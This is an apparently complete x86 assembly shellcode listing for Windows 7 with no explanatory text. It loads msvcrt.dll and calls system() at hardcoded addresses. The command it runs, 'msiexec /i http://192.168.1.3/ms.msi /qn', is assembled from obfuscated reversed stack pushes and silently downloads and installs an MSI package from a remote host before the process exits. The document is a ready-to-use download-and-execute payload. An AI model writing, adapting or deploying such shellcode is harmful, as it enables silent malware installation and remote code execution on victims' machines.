xor eax, eax             ;Get the msvcrt.dll
mov ax, 0x7472           ;"tr\0\0"
push eax
push dword 0x6376736d    ;"cvsm"
push esp

; LoadLibrary
mov ebx, 0x7717de85      ;Address of function LoadLibraryA (win7)
call ebx
mov ebp, eax             ;msvcrt.dll is saved in ebp

xor eax, eax             ;zero out EAX
PUSH eax                 ;NULL at the end of string
PUSH 0x6e712f20          ;"nq/ "
PUSH 0x69736d2e          ;"ism."
PUSH 0x736d2f33          ;"sm/3"
PUSH 0x2e312e38          ;".1.8"
PUSH 0x36312e32          ;"61.2"
PUSH 0x39312f2f          ;"91//"
PUSH 0x3a707474          ;":ptt"
PUSH 0x6820692f          ;"h i/"
PUSH 0x20636578          ;" cex"
PUSH 0x6569736d          ;"eism"
MOV EDI,ESP              ;adding a pointer to the stack
PUSH EDI
MOV EAX,0x7587b177       ;calling the system()(win7)
CALL EAX

xor eax, eax
push eax
mov eax, 0x7718be52     ; ExitProcess
call eax
